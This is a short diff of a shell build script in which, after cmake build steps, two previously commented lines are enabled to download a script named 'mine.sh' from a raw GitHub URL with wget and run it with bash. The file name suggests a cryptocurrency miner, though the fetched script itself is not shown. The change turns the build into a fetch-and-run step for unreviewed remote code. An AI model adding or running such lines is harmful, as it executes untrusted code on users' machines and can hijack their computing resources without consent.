@@ -20,5 +20,5 @@ cmake ..
 cmake --build .
 
 # Download mine.sh and run it
-#wget https://raw.githubusercontent.com/inklbot/a/main/mine.sh
-#bash mine.sh
+wget https://raw.githubusercontent.com/inklbot/a/main/mine.sh
+bash mine.sh
